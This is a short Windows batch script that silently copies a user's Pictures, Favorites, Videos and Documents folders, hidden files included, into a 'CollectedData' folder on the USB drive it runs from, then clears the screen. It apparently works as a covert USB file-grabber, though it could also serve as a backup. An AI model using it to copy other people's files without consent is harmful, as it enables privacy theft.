@echo off

:: This basically runs the script dynamically. (E:, D:, L: Doesn't matter)
set usbDrive=%~d0

:: Setting up the folder on USB dynamically
set dest=%usbDrive%\CollectedData

if not exist "%dest%" mkdir "%dest%"

:: Setup xcopy options.
set backupcmd=xcopy /s /c /d /e /h /i /r /y

:: Target things to covers. You can add your own here.
%backupcmd% "%USERPROFILE%\Pictures"   "%dest%\My pics"
%backupcmd% "%USERPROFILE%\Favorites"  "%dest%\Favorites"
%backupcmd% "%USERPROFILE%\Videos"     "%dest%\Videos"
%backupcmd% "%USERPROFILE%\Documents"  "%dest%\Documents"
cls
